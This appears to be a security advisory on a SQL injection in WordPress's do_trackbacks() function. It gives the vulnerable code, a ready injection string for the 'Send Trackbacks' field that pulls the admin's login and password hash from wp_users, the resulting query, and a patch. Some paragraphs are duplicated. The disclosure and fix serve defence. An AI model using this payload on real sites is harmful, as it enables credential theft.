@@ -1,0 +1,106 @@
+Description: SQL injection vulnerability in do_trackbacks() function of WordPress allows remote attackers to execute arbitrary SELECT SQL query.
+Access Vector: Network
+Attack Complexity: Medium
+Authentication: Single Instance
+Confidentiality Impact: Partial
+Integrity Impact: None
+Availability Impact: None
+
+UPDATE Dec 1, 2010: This vulnerability was first discovered by M4g and is described in this
+article.
+
+The do_trackbacks() function in wp-includes/comment.php does not properly escape the input that
+comes from the user, allowing a remote user with publish_posts and edit_published_posts
+capabilities to execute an arbitrary SELECT SQL query, which can lead to disclosure of any
+information stored in the WordPress database.
+
+function do_trackbacks($post_id) {
+    global $wpdb;
+ 
+    $post = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->posts WHERE ID = %d", $post_id) );
+    $to_ping = get_to_ping($post_id);
+    $pinged  = get_pung($post_id);
+    if ( empty($to_ping) ) {
+        $wpdb->update($wpdb->posts, array('to_ping' => ''), array('ID' => $post_id) );
+        return;
+    }
+ 
+    if ( empty($post->post_excerpt) )
+        $excerpt = apply_filters('the_content', $post->post_content);
+    else
+        $excerpt = apply_filters('the_excerpt', $post->post_excerpt);
+    $excerpt = str_replace(']]>', ']]>', $excerpt);
+    $excerpt = wp_html_excerpt($excerpt, 252) . '...';
+ 
+    $post_title = apply_filters('the_title', $post->post_title);
+    $post_title = strip_tags($post_title);
+ 
+    if ( $to_ping ) {
+        foreach ( (array) $to_ping as $tb_ping ) {
+            $tb_ping = trim($tb_ping);
+            if ( !in_array($tb_ping, $pinged) ) {
+                trackback($tb_ping, $post_title, $excerpt, $post_id);
+                $pinged[] = $tb_ping;
+            } else {
+                $wpdb->query( $wpdb->prepare("UPDATE $wpdb->posts SET to_ping = TRIM(REPLACE(to_ping, '$tb_ping', '')) WHERE ID = %d", $post_id) );
+            }
+        }
+    }
+}
+
+The $tb_ping variable is passed to the query in line 1657 unescaped.
+
+Exploitation. The logged in user must have publish_posts and edit_published_posts capabilities
+(this corresponds to the Author role).
+
+First, the user creates a new post (title/content does not matter); text to put into the “Send Trackbacks” field is:
+
+AAA’,”)),post_title=(select/**/concat(user_login,’|',user_pass)/**/from/**/wp_users/**/where/**/id=1),post_content_filtered=TRIM(REPLACE(to_ping,’
+
+and publishes it. He needs to wait a bit — for wp-cron.php to process the trackback. The get_to_ping() function says that this trackback is to be processed:
+
+AAA','')),post_title=(select/**/concat(user_login,'|',user_pass)/**/from/**/wp_users/**/where/**/id=1),post_content_filtered=TRIM(REPLACE(to_ping,'
+
+Then the user goes back and edits the post.
+
+Now the user duplicates the text in the “Send Trackbacks” field and updates the post:
+
+AAA’,”)),post_title=(select/**/concat(user_login,’|',user_pass)/**/from/**/wp_users/**/where/**/id=1),post_content_filtered=TRIM(REPLACE(to_ping,’
+
+AAA’,”)),post_title=(select/**/concat(user_login,’|',user_pass)/**/from/**/wp_users/**/where/**/id=1),post_content_filtered=TRIM(REPLACE(to_ping,’
+
+The get_to_ping() function says that these trackbacks are to be processed:
+
+AAA','')),post_title=(select/**/concat(user_login,'|',user_pass)/**/from/**/wp_users/**/where/**/id=1),post_content_filtered=TRIM(REPLACE(to_ping,'
+
+AAA','')),post_title=(select/**/concat(user_login,'|',user_pass)/**/from/**/wp_users/**/where/**/id=1),post_content_filtered=TRIM(REPLACE(to_ping,'
+
+Query logging shows that WordPress executes this query (reformatted for the sake of readbility):
+
+UPDATE wp_posts
+SET to_ping = TRIM(REPLACE(to_ping, 'AAA','')),post_title=(select/**/concat(user_login,'|',user_pass)/**/from/**/wp_users/**/where/**/id=1),post_content_filtered=TRIM(REPLACE(to_ping,'', ''))
+WHERE ID = 11
+
+After that when the user refreshes the page (he may need to wait a bit for wp-cron.php to complete), the admin information is shown in the input box.
+
+Likewise, any information (login salt, nonce salt, email addresses etc) can be disclosed.
+The screenshots above are for WordPress 3.0.1 but the vulnerability seems to exist since 2.x branch.
+
+Likewise, any information (login salt, nonce salt, email addresses etc) can be disclosed.
+The examples above are for WordPress 3.0.1 but the vulnerability seems to exist since 2.x branch.
+
+Patch: below is the patch against WordPress 3.1 rev. 16609 that fixes the vulnerability:
+
+Index: wp-includes/comment.php
+===================================================================
+--- wp-includes/comment.php (revision 16609)
++++ wp-includes/comment.php (working copy)
+@@ -1723,7 +1723,7 @@
+                trackback($tb_ping, $post_title, $excerpt, $post_id);
+                $pinged[] = $tb_ping;
+            } else {
+-               $wpdb->query( $wpdb->prepare("UPDATE $wpdb->posts SET to_ping = TRIM(REPLACE(to_ping, '$tb_ping', '')) WHERE ID = %d", $post_id) );
++               $wpdb->query( $wpdb->prepare("UPDATE $wpdb->posts SET to_ping = TRIM(REPLACE(to_ping, %s, '')) WHERE ID = %d", $tb_ping, $post_id) );
+            }
+        }
+    }
